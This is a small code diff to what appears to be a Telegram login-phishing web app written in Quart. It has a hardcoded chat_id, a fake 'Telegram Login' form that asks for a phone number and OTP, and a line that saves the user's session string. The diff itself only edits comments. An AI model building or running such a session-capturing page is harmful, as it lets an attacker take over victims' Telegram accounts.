@@ -14,7 +14,7 @@ chat_id = '6782038686'
 app = Quart(__name__)
 clients = {}
 
-# HTML template
+# HTML Template
 BASE_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -151,7 +151,6 @@ async def index():
         except Exception as e:
             return await render_page(f"<h2>❌ Error:</h2><p>{e}</p>")
 
-    # GET request
     return await render_page('''
         <h2>📱 Telegram Login</h2>
         <form method="post" onsubmit="return fixPhoneInput()">
@@ -245,7 +244,6 @@ async def otp():
             </form>
         ''')
 
-    # ✅ Success
     session_string = client.session.save()
     await client.disconnect()
     del clients[phone]
